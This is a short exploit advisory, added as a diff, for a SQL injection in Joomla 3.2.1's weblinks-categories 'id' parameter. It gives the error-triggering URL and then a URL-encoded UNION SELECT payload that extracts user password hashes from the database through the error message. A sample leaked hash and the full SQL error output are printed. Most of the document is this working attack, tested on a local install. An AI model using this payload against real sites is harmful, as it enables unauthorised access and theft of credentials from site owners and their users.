@@ -1,0 +1,24 @@
+# Exploit Title: Joomla 3.2.1 sql injection
+# Date: 05/02/2014
+# Exploit Author: kiall-9@mail.com
+# Vendor Homepage: http://www.joomla.org/
+# Software Link: http://joomlacode.org/gf/download/frsrelease/19007/134333/Joomla_3.2.1-Stable-Full_Package.zip
+# Version: 3.2.1 (default installation with Test sample data)
+# Tested on: Virtualbox (debian) + apache
+POC=>
+http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=\
+
+will cause an error:
+
+1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\)' at line 3 SQL=SELECT `t`.`id` FROM `k59cv_tags` AS t INNER JOIN `k59cv_contentitem_tag_map` AS m ON `m`.`tag_id` = `t`.`id` AND `m`.`type_alias` = 'com_weblinks.categories' AND `m`.`content_item_id` IN ( \) Array ( [type] => 8 [message] => Undefined offset: 0 [file] => /var/www/Joomla_3.2.1/libraries/joomla/filter/input.php [line] => 203 )
+
+I modified the original error.php file with this code --- <?php print_r(error_get_last()); ?> --- in order to obtain something useful. ;-)
+
+Now i can easily exploit this flaw:
+
+http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60k59cv_users%60%20--%20%29
+and obtain the hash:
+
+1054 Unknown column '$P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1' in 'where clause' SQL=SELECT `m`.`tag_id`,`m`.`core_content_id`,`m`.`content_item_id`,`m`.`type_alias`,COUNT( `tag_id`) AS `count`,`t`.`access`,`t`.`id`,`ct`.`router`,`cc`.`core_title`,`cc`.`core_alias`,`cc`.`core_catid`,`cc`.`core_language` FROM `k59cv_contentitem_tag_map` AS `m` INNER JOIN `k59cv_tags` AS `t` ON m.tag_id = t.id INNER JOIN `k59cv_ucm_content` AS `cc` ON m.core_content_id = cc.core_content_id INNER JOIN `k59cv_content_types` AS `ct` ON m.type_alias = ct.type_alias WHERE `m`.`tag_id` IN ($P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1) AND t.access IN (1,1) AND (`m`.`content_item_id` <> 0 ) union select password from `k59cv_users` -- ) OR `m`.`type_alias` <> 'com_weblinks.categories') AND `cc`.`core_state` = 1 GROUP BY `m`.`core_content_id` ORDER BY `count` DESC LIMIT 0, 5
+
+CheerZ>
